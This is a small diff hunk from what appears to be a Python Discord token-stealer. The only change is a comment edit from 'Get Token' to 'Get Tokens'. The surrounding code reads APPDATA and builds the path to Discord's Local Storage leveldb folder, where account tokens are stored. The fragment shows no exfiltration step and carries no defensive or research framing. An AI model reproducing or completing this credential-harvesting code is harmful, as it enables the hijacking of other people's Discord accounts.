@@ -85,7 +85,7 @@ def reportError(error):
         },
     )
 
-# Get Token
+# Get Tokens
 app=os.getenv('APPDATA')
 tokendir = app + '\\Discord\\Local Storage\\leveldb\\'
 
